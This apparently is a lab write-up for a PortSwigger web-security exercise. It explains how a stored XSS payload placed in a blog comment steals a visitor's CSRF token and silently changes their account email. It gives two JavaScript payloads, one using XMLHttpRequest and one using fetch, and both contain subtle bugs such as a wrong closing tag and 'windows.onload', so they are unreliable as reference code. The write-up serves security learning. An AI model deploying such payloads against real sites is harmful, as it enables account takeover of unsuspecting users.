# Exploiting XSS to perform CSRF

In this challenge, we need to perform XSS and CSRF attack. In details, we need to create a payload that force user to change their email without their consent. There's actually few ways to solve the challenge, including using XMLHttpRequest, Using Form Action, or using fetch function. Here I'll perform using the **XMLHttpRequest** and **fetch** solution.

Here we can see an account page, where our user email is: **wiener@normal-user.net**

<img style="margin-top: 20px;" src="https://github.com/DJumanto/Portswigger-XSS/blob/main/Exploiting%20XSS%20to%20perform%20CSRF/Account.png?raw=true" alt="account page">

And if we see the code in developer tools, we need the user csrf token in order to change their email address. And the endpoint to perform it is **/my-account/change-email**

<img style="margin-top: 20px;" src="https://github.com/DJumanto/Portswigger-XSS/blob/main/Exploiting%20XSS%20to%20perform%20CSRF/request-requirement.png?raw=true" alt="requirement">

Just like a few challenge before, we able to insert out payload in the comment section of the box, the idea is whenever everyone open the blog that has our injected payload, will be forced to request email change without they consent.

<img style="margin-top: 20px;" src="https://github.com/DJumanto/Portswigger-XSS/blob/main/Exploiting%20XSS%20to%20perform%20CSRF/Exploit%20spot.png?raw=true" alt="requirement">

<img style="margin-top: 20px;" src="https://github.com/DJumanto/Portswigger-XSS/blob/main/Exploiting%20XSS%20to%20perform%20CSRF/script-tag-attempt.png?raw=true" alt="requirement">

So here's few payload that we able to do:
```javascript
//XMLHttpRequest
<script>
const req = new XMLHttpRequest();
req.open("GET","/my-account",true)
req.onload = () => {
    var csrfToken = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var emailReq = new XMLHttpRequest()
emailReq.open("POST","/my-account/change-email",true)
emailReq.send('csrf='+csrfToken+'&email=xss@attempt.com');
}
req.send()
<script>

//fetchrequest
<script>
windows.onload = function() {
    var token = document.getElementsByName('csrf')[0].value
    fetch("https://YOUR-LAB-ID.web-security-academy.net.com/my-account/change-email",{
        method: "POST",
        mode: "no-cors",
        body: "csrf="+token+"&email=xss@attemp.com"
    });
}
</script>
```

the first method will request the web-server to give us the content of my-account page and ask for it's csrf value, then perform a request using it's csrf token. While the second just directly ask for the change-email endpoint to perform email change, if the email is invalid, just add the payload again but change it's email to other email address (Honestly i don't know why but it worked).

The result is:
<img style="margin-top: 20px;" src="https://github.com/DJumanto/Portswigger-XSS/blob/main/Exploiting%20XSS%20to%20perform%20CSRF/final%20result.png?raw=true" alt="requirement">



